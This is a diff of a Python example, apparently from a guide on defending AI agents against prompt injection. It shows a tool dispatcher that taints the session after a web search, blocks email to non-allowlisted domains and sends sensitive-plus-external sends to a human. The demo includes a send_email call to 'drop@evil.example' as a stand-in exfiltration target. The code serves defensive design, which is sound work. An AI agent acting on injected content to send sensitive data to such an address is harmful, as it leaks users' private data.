@@ -207,40 +207,27 @@ It taints the session when untrusted content enters, and once tainted it refuses
 unknown domains and routes sensitive sends to a human.
 
 ```python
-from dataclasses import dataclass, field
-
 TOOLS = {  # capability flags declared at registration, reviewed like code
-    "search_web":  {"untrusted_output": True},
-    "read_crm":    {"sensitive": True},
-    "send_email":  {"external": True},
+    "search_web": {"untrusted_output": True},
+    "read_crm":   {"sensitive": True},
+    "send_email": {"external": True},
 }
 ALLOWED_DOMAINS = {"acme.com"}
 
-@dataclass
-class Session:
-    tainted: bool = False          # untrusted text has entered the context
-    touched_sensitive: bool = False
-    log: list = field(default_factory=list)
-
-def dispatch(s: Session, tool: str, args: dict) -> str:
+def dispatch(s: dict, tool: str, args: dict) -> str:
     cap = TOOLS[tool]
-    if cap.get("external"):
-        domain = args["to"].rsplit("@", 1)[-1].lower()
-        if s.tainted and domain not in ALLOWED_DOMAINS:
-            return deny(s, tool, "tainted session, recipient outside allowlist")
-        if s.tainted and s.touched_sensitive:
-            return pending_approval(s, tool, args)   # all three legs: human decides
-    s.touched_sensitive |= cap.get("sensitive", False)
-    s.tainted |= cap.get("untrusted_output", False)
-    s.log.append((tool, args, "allowed"))
+    if cap.get("external") and s["tainted"]:
+        if args["to"].rsplit("@", 1)[-1].lower() not in ALLOWED_DOMAINS:
+            return "denied"          # tainted session, recipient outside allowlist
+        if s["sensitive"]:
+            return "approval"        # all three legs: a human decides
+    s["sensitive"] |= cap.get("sensitive", False)
+    s["tainted"] |= cap.get("untrusted_output", False)
     return "ok"
 
-def deny(s, tool, why):            s.log.append((tool, why, "denied")); return "denied"
-def pending_approval(s, tool, a):  s.log.append((tool, a, "approval")); return "approval"
-
-s = Session()
+s = {"tainted": False, "sensitive": False}   # untrusted text seen? sensitive data touched?
 dispatch(s, "read_crm", {"q": "Q3 pipeline"})
-dispatch(s, "search_web", {"q": "competitor pricing"})   # page may contain an injection
+dispatch(s, "search_web", {"q": "competitor pricing"})         # page may contain an injection
 print(dispatch(s, "send_email", {"to": "drop@evil.example"}))  # denied, whatever the prompt said
 print(dispatch(s, "send_email", {"to": "cfo@acme.com"}))       # approval
 ```
